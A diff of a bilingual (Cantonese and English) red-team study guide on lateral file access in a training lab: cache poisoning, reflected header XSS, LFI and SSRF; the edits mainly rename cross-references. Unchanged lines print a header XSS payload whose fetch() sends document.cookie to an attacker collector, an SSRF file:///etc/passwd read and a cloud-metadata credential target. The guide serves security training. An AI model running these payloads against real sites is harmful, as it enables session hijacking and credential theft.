@@ -1,10 +1,10 @@
-# ART T3 P5：攻擊鏈⑤ 橫向檔案存取（Lateral File Access）— 雙語應考學習指南
+# ART T3 ART_T3_07：攻擊鏈⑤ 橫向檔案存取（Lateral File Access）— 雙語應考學習指南
 
 > **原教材**：Advanced Red Team — Tutorial 3（PDF p.66–73、86–96、112–119、143–154）｜覆蓋 section：§5、§7、§10、§14
 > **來源檔**：`_PH5_lateral_file_access_SRC.txt`（由第三方英文教材按攻擊鏈階段重新打包嘅純文字）
 > **閱讀方法**：繁中解說理解邏輯 → 英文 Blockquote 直接背誦 → 逐節 Walkthrough 照做 → 最後對照懶人包自測
 > **本檔邊界**：只覆蓋 §5 Web Cache Poisoning、§7 Reflected XSS via HTTP Header、§10 LFI via Language Loader、§14 SSRF。
-> 　§13 OAuth 唔屬本檔（見 P2B）；§11 Host Privesc 唔屬本檔（見 P6），全檔只作交叉引用。
+> 　§13 OAuth 唔屬本檔（見 ART_T3_04）；§11 Host Privesc 唔屬本檔（見 ART_T3_08），全檔只作交叉引用。
 > **相關筆記**：➜ 憑證蒐集見 `ART_T3_06_CredentialDiscovery_StudyGuide.md`；主機淪陷見 `ART_T3_08_HostCompromise_StudyGuide.md`；速記見 `ART_Final_CheatSheet.md`
 
 ---
@@ -32,11 +32,11 @@
 
 本檔一次過覆蓋原文四個獨立 section，佢哋表面上係四個唔同漏洞，但骨子裏共用同一條**根本病因線**：**「用戶控制嘅輸入，被程式當成可信嘅路徑／URL／頭部直接使用，冇驗證、冇 allow-list」**。§5 係「header 值被當成 hostname 砌入 HTML，而 cache key 又漏咗佢」；§7 係「header 值被當成用戶名，原封不動 echo 入頁面」；§10 係「`?lang=` 參數被直接拼入檔案路徑」；§14 係「`?url=`／表單 URL 被直接攞去 `file_get_contents()` 發請求」。讀嘅時候請不斷自問：「呢個輸入係邊度嚟？程式有冇當佢係人打嘅嘢去驗證？」——呢條問題答得到，四節就通。
 
-**前置假設**：本檔假設你已經完成 ①公開偵察（識得喺靶場周圍行、睇 page source）、②初始存取（有一個普通帳號同 active session）、③權限提升、④憑證蒐集（至少搵到一條可用憑證或一個 foothold）。§10 嘅第二、三步更加會**直接依賴 §9 備份檔爆破**嘅成果（即係搵到 `/backup/config.php.bak`）；§7 偷到嘅 `PHPSESSID` 亦會**交叉鏈去 §13 OAuth**（嗰部分屬 P2B 檔）。冇呢啲前置，你照做 Walkthrough 都做得到，但你就睇唔到「鏈式攻擊」嘅威力。
+**前置假設**：本檔假設你已經完成 ①公開偵察（識得喺靶場周圍行、睇 page source）、②初始存取（有一個普通帳號同 active session）、③權限提升、④憑證蒐集（至少搵到一條可用憑證或一個 foothold）。§10 嘅第二、三步更加會**直接依賴 §9 備份檔爆破**嘅成果（即係搵到 `/backup/config.php.bak`）；§7 偷到嘅 `PHPSESSID` 亦會**交叉鏈去 §13 OAuth**（嗰部分屬 ART_T3_04 檔）。冇呢啲前置，你照做 Walkthrough 都做得到，但你就睇唔到「鏈式攻擊」嘅威力。
 
 **實務情境一（真實滲透測試）**：你受僱評估一個客戶嘅政府入口網站。做咗 recon 之後，你喺 `/contact.php` 見到「Return to home」連結嘅 hostname 竟然係由 request header 砌出嚟；你用 proxy 改 `X-Forwarded-Host`，發現頁面立即變；再留意到回應有 `X-Cache: HIT` 之類嘅 header，於是你知道前面有個 shared cache。呢個就係 §5 嘅切入點——假如成功污染，之後每個訪問該頁嘅市民都會收到你植入嘅惡意連結。同一時間你發現 `/services.php` 有「Page Preview」功能，一試之下伺服器會代你去 fetch 任何 URL——呢個就係 §14 SSRF 嘅切入點，配合雲環境（`169.254.169.254`）可以一次過拎到雲端憑證。兩個漏洞串埋一齊，就係一隻「唔用戶主機被入侵、但己方已橫向攞到大量內部資料」嘅高嚴重度報告。
 
-**實務情境二（攻防演練／CTF）**：CTF 靶場通常時間有限，橫向階段嘅策略係「**先易後難、先讀後打**」。最易嘅係 §10 LFI——`?lang=` 呢類參數一試 payload 就見真章，讀 `/etc/passwd` 零成本、無副作用，幾乎係熱身題。跟住係 §14 SSRF——`/imgproxy.php?url=file:///etc/passwd` 可以當「任意檔案讀取器」用，係由「外部 URL」跨去「內部服務」嘅橋樑。再上就係 §7 反射 XSS——當靶場冇得直接讀檔，就要靠偷 admin 嘅 session cookie 去接管帳號（屬 P2B／§13 範疇）。最考功夫嘅係 §5 Cache Poisoning——因為你要先清 cache、再用 canary 確認 unkeyed input，次序做錯就會失敗，但成功嗰一刻一個 request 就影響成千上萬用戶，回報極高。
+**實務情境二（攻防演練／CTF）**：CTF 靶場通常時間有限，橫向階段嘅策略係「**先易後難、先讀後打**」。最易嘅係 §10 LFI——`?lang=` 呢類參數一試 payload 就見真章，讀 `/etc/passwd` 零成本、無副作用，幾乎係熱身題。跟住係 §14 SSRF——`/imgproxy.php?url=file:///etc/passwd` 可以當「任意檔案讀取器」用，係由「外部 URL」跨去「內部服務」嘅橋樑。再上就係 §7 反射 XSS——當靶場冇得直接讀檔，就要靠偷 admin 嘅 session cookie 去接管帳號（屬 ART_T3_04／§13 範疇）。最考功夫嘅係 §5 Cache Poisoning——因為你要先清 cache、再用 canary 確認 unkeyed input，次序做錯就會失敗，但成功嗰一刻一個 request 就影響成千上萬用戶，回報極高。
 
 > **English Standard Definition:** Lateral file access groups together the techniques that let an attacker read files or make requests on the server's behalf — Local File Inclusion, Server-Side Request Forgery, cache poisoning, and reflected header XSS — all rooted in unvalidated client-controlled input.
 
@@ -514,7 +514,7 @@ X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURICo
 ```
 X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">
 ```
-- 預期結果：`fetch()` 把 cookie 送去 collector，marker 確認外傳已觸發——netcat 顯示 `GET /?c=PHPSESSID%3D…`，或者（用 lab endpoint 時）出現「Cookie exfiltrated to attacker server」標記。**呢一步就係把 XSS 變成帳號接管嘅關鍵**：有咗偷到嘅 `PHPSESSID`，你就可以冒充受害者（§13 更會把喺本 lab 備份檔搵到嘅 secret 鏈去完整帳號接管——該部分見 P2B）。
+- 預期結果：`fetch()` 把 cookie 送去 collector，marker 確認外傳已觸發——netcat 顯示 `GET /?c=PHPSESSID%3D…`，或者（用 lab endpoint 時）出現「Cookie exfiltrated to attacker server」標記。**呢一步就係把 XSS 變成帳號接管嘅關鍵**：有咗偷到嘅 `PHPSESSID`，你就可以冒充受害者（§13 更會把喺本 lab 備份檔搵到嘅 secret 鏈去完整帳號接管——該部分見 ART_T3_04）。
 
 > **圖示描述**：頁面顯示 highlight 標記「Cookie exfiltrated to attacker server」，確認外傳觸發（原教材截圖，本筆記不轉載圖片）。
 
